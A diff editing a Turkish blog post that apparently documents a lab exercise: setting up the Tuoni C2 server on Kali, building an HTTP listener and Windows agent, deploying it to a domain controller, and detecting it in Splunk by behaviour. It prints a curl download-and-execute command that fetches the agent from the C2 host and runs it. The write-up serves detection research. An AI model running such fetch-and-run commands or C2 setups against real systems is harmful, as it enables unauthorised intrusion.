@@ -9,13 +9,13 @@ image:
   alt: DC01 üzerindeki Tuoni ajan oturumu ve PID 6080
 ---
 
-Bir beacon'ın dosya adı ve bağlandığı IP biliniyorsa, onu Splunk'ta bulmak bir tespit değil, basit bir arama işlemidir. `calclistlogic.exe` ve `192.168.86.128` yazılır, ilgili olaylar listelenir. Gerçek bir vakanın sorunu şudur ki bu iki bilgi analiste önceden verilmez; çoğu zaman en sonda, olay gerçekleştikten sonra öğrenilir.
+Bir beacon'ın dosya adı ve bağlandığı IP biliniyorsa, onu Splunk'ta bulmak bir tespit değil, basit bir arama işlemidir. `calclistlogic.exe` ve `192.168.86.128` yazılır, ilgili olaylar listelenir. Ancak gerçek bir vakada bu iki bilgi analiste önceden verilmez; çoğu zaman olay gerçekleştikten sonra öğrenilir.
 
 Bu nedenle deneyi tersten kurguladık: dosya adını ve IP'yi aramadan tamamen çıkardığımızda, Windows bu ajanı yalnızca **davranışıyla** gösterebilir mi? Süreci üç kez çalıştırdık ve üçünde de aynı sıra ortaya çıktı. Kullanıcı profilinin altından başlayan bir süreç kısa bir pencerede dokuz token ayrıcalığını etkinleştirdi ve bunu yapar yapmaz, yedi ila dokuz saniye içinde Kali'ye giden bir TCP bağlantısı açtı. Tespit ettiğimiz şey bir imza değil, bu davranış sırasıydı.
 
 ## Laboratuvar topolojisi
 
-İki makine yeterli oldu. Kali (`192.168.86.128`) Tuoni sunucusunu ve HTTP listener'ı barındırdı. Windows tarafında DC01 (`192.168.86.129`) hedef sistemdi ve Security olaylarını bir Splunk Universal Forwarder aracılığıyla `windows` indeksine iletiyordu. Bu kurgu, saldırı tarafında Tuoni konsolunda görünen oturumu, savunma tarafında Splunk'a düşen süreç kimliğiyle birebir eşleştirmemizi sağladı. Aynı PID'yi iki ayrı tarafta görmek, korelasyonun doğruluğunu teyit etmenin en güvenilir yoludur.
+İki makine yeterli oldu. Kali (`192.168.86.128`) Tuoni sunucusunu ve HTTP listener'ı barındırdı. Windows tarafında DC01 (`192.168.86.129`) hedef sistemdi ve Security olaylarını bir Splunk Universal Forwarder aracılığıyla `windows` indeksine iletiyordu. Bu kurgu, saldırı tarafında Tuoni konsolunda görünen oturumu, savunma tarafında Splunk'a düşen süreç kimliğiyle birebir eşleştirmemizi sağladı. Aynı PID'nin iki ayrı tarafta görülmesi, korelasyonun doğruluğunu teyit eder.
 
 ## Kali'de Tuoni'yi ayağa kaldırmak
 
@@ -37,7 +37,7 @@ _Görsel 2 · Yeni imajlar indiriliyor._
 ![Dört konteyner çalışıyor ve Nginx yapılandırma testi başarılı.](/assets/img/posts/tuoni-03.png)
 _Görsel 3 · Dört konteyner Running durumunda, Nginx yapılandırma testi başarılı._
 
-Servisin dinleyip dinlemediğini doğrulamak için yönetim arayüzünün ve API'nin portlarını kontrol ettik. Tek bir `ss` çıktısı, "kurulum tamamlandı ancak port kapalı" türünden uzun bir hata ayıklamayı baştan önler.
+Yönetim arayüzünün ve API'nin dinlediği portları `ss` ile doğruladık.
 
 ```bash
 sudo ss -lntp '( sport = :12702 or sport = :8443 )'
@@ -72,7 +72,7 @@ _Görsel 8 · Konsola giriş._
 
 ## HTTP listener ve Windows x64 ajanı
 
-Listener tarafı basittir; ancak kolayca gözden kaçan bir ayrıntı içerir. `Listeners → New listener` ekranında `shelldot.listener.agent-reverse-http` eklentisini seçtik. Listener'a `HTTPListener` adını verdik; Host alanına Windows'un erişebildiği Kali adresini, Port alanına `8080` değerini girdik ve protokolü HTTP olarak bıraktık. Buradaki Host, ajanın geri bağlanacağı adrestir; bu alanın `127.0.0.1` bırakılması laboratuvar ortamında en sık karşılaşılan yapılandırma hatasıdır.
+`Listeners → New listener` ekranında `shelldot.listener.agent-reverse-http` eklentisini seçtik. Listener'a `HTTPListener` adını verdik; Host alanına Windows'un erişebildiği Kali adresini, Port alanına `8080` değerini girdik ve protokolü HTTP olarak bıraktık. Buradaki Host, ajanın geri bağlanacağı adrestir; bu alan `127.0.0.1` olarak bırakılırsa ajan Kali'ye erişemez.
 
 ![Callback hedefi 192.168.86.128:8080 olarak tanımlanıyor.](/assets/img/posts/tuoni-09.png)
 _Görsel 9 · Callback hedefi 192.168.86.128:8080._
@@ -80,7 +80,7 @@ _Görsel 9 · Callback hedefi 192.168.86.128:8080._
 ![Started durumu listener'ın çalıştığını gösteriyor.](/assets/img/posts/tuoni-10.png)
 _Görsel 10 · Listener Started durumunda._
 
-Listener satırını genişlettiğimizde iki ayrı alan dikkat çekiciydi: `bindAddress` içinde `0.0.0.0`, `httpCallbacks → hosts` içinde `192.168.86.128`. İlki Kali'nin hangi arayüzlerde dinlediğini, ikincisi ajanın nereye bağlanacağını belirler. Bu iki alanın karıştırılması, "listener çalışıyor ancak ajan geri dönmüyor" tablosunun bilinen sebeplerinden biridir.
+Listener satırını genişlettiğimizde iki ayrı alan dikkat çekiciydi: `bindAddress` içinde `0.0.0.0`, `httpCallbacks → hosts` içinde `192.168.86.128`. İlki Kali'nin hangi arayüzlerde dinlediğini, ikincisi ajanın nereye bağlanacağını belirler. Bu iki alanın karıştırılması, listener çalışsa dahi ajanın geri bağlanmamasına yol açar.
 
 ![Çalışan listener'ın JSON yapılandırması ve HTTP yolları.](/assets/img/posts/tuoni-11.png)
 _Görsel 11 · Listener'ın JSON yapılandırması ve HTTP yolları._
@@ -90,7 +90,7 @@ Payload'ı `Payloads → New payload` üzerinden ürettik. `HTTPListener`'ı se�
 ![Windows x64 yürütülebilir dosyasının oluşturulması.](/assets/img/posts/tuoni-12.png)
 _Görsel 12 · Windows x64 yürütülebilir dosyası üretiliyor._
 
-Deploy ekranı CMD için hazır bir komut üretti. İndirme ve çalıştırma adımlarını laboratuvarda bilinçli olarak ayırdık; Windows telemetrisinde bu iki işlem farklı olaylar ürettiğinden, ayrı adımlarda incelemek tespit açısından daha açıklayıcıdır.
+Deploy ekranı CMD için hazır bir komut üretti. İndirme ve çalıştırma adımlarını ayrı yürüttük; bu iki işlem Windows telemetrisinde farklı olaylar üretir ve ayrı adımlarda ayrı ayrı gözlemlenir.
 
 ```batch
 curl.exe "http://192.168.86.128:8080/payload?payloadId=1" -o calclistlogic.exe && calclistlogic.exe
@@ -101,7 +101,7 @@ _Görsel 13 · Üretilen deploy komutu._
 
 ## Windows'ta ilk bağlantı ve komut doğrulaması
 
-Ajanı çalıştırmadan önce ağ yolunu sınadık. Payload'ı çalıştırıp bağlantının neden kurulmadığını sonradan araştırmak yerine, tek bir `Test-NetConnection` ile 8080 portunun erişilebilir olduğunu doğrulamak daha verimlidir.
+Ajanı çalıştırmadan önce `Test-NetConnection` ile 8080 portuna ağ erişimini doğruladık.
 
 ```powershell
 Test-NetConnection -ComputerName 192.168.86.128 -Port 8080
@@ -110,7 +110,7 @@ Test-NetConnection -ComputerName 192.168.86.128 -Port 8080
 ![192.168.86.129 üzerinden yapılan TCP testi başarılı.](/assets/img/posts/tuoni-14.png)
 _Görsel 14 · TcpTestSucceeded : True._
 
-Yol erişilebilir olduğundan payload'ı indirdik.
+Erişim doğrulandıktan sonra payload'ı indirdik.
 
 ```batch
 curl.exe "http://192.168.86.128:8080/payload?payloadId=1" -o calclistlogic.exe
@@ -119,12 +119,12 @@ curl.exe "http://192.168.86.128:8080/payload?payloadId=1" -o calclistlogic.exe
 ![Dosya Windows'ta Administrator profilinin altına indirildi.](/assets/img/posts/tuoni-15.png)
 _Görsel 15 · Dosya Administrator profilinin altına indirildi._
 
-Dosya çalıştırıldığında Tuoni'nin `Agents` görünümünde DC01 ve `calclistlogic.exe` belirdi. Burada önemli bir ayrıntı kaydettik: Windows'un 4688 olaylarında bu üç çalıştırmanın ebeveyni `explorer.exe`'ydi. Yani süreç ağacının kökünde bir kullanıcı etkileşimi vardı. Tespit kuralındaki "kullanıcı profilinden ve interaktif olarak başlayan süreç" varsayımı bu gözleme dayanır.
+Dosya çalıştırıldığında Tuoni'nin `Agents` görünümünde DC01 ve `calclistlogic.exe` belirdi. Windows'un 4688 olaylarında bu üç çalıştırmanın ebeveyni `explorer.exe`'ydi; dolayısıyla süreç ağacının kökünde bir kullanıcı etkileşimi bulunuyordu. Tespit kuralındaki "kullanıcı profilinden ve interaktif olarak başlayan süreç" varsayımı bu gözleme dayanır.
 
 ![İlk bağlantıda makine, kullanıcı, ajan süreci ve listener aynı satırda görünüyor.](/assets/img/posts/tuoni-16.png)
 _Görsel 16 · İlk check-in: makine, kullanıcı, ajan süreci ve listener aynı satırda._
 
-Grafik görünümünde DC01'in `HTTPListener` üzerinden sunucuya ulaştığı açıkça görülüyordu. Oturumlardan birinin alt bilgi çubuğunda `PID 6080` değeri yer alıyordu. Bu numaranın not edilmesi gerekir; birazdan Splunk sonucunda aynısını ondalık biçimde göreceğiz. İki taraftaki PID'nin örtüşmesi, korelasyonun tesadüf olmadığının kanıtıdır.
+Grafik görünümünde DC01'in `HTTPListener` üzerinden sunucuya ulaştığı açıkça görülüyordu. Oturumlardan birinin alt bilgi çubuğunda `PID 6080` değeri yer alıyordu. Aynı PID, ileride Splunk sonucunda ondalık biçimde yeniden görünür. İki taraftaki PID'nin örtüşmesi, korelasyonun tesadüfi olmadığını gösterir.
 
 ![DC01 üzerindeki ajan oturumu ve PID 6080.](/assets/img/posts/tuoni-17.png)
 _Görsel 17 · Ajan oturumu, PID 6080._
@@ -140,7 +140,7 @@ _Görsel 18 · C2 üzerinden alınan `ps` çıktısı._
 
 ## Splunk'ta hangi olayları birleştirdik?
 
-Çalışmanın savunma tarafı burada başlar. İncelediğimiz 120 Security kaydında her çalıştırma için **yalnızca bir** giden bağlantı olayı mevcuttu. Çoğu C2 tespit kuralının dayandığı "belirli sayıda bağlantı" veya "düzenli aralıklarla tekrarlayan beacon" koşulu uygulansaydı, üç örnek de gözden kaçardı. Tek bir check-in, hacim tabanlı mantığın kör noktasıdır.
+İncelediğimiz 120 Security kaydında her çalıştırma için **yalnızca bir** giden bağlantı olayı mevcuttu. Çoğu C2 tespit kuralının dayandığı "belirli sayıda bağlantı" veya "düzenli aralıklarla tekrarlayan beacon" koşulu uygulansaydı, üç örnek de gözden kaçardı. Tek bir check-in, hacim tabanlı mantığın kör noktasıdır.
 
 Bu nedenle hacme değil, **ağ bağlantısından hemen önce aynı süreçte gerçekleşen olaylara** odaklandık. Üç olay türü bir araya geldiğinde davranış tamamlanır:
 
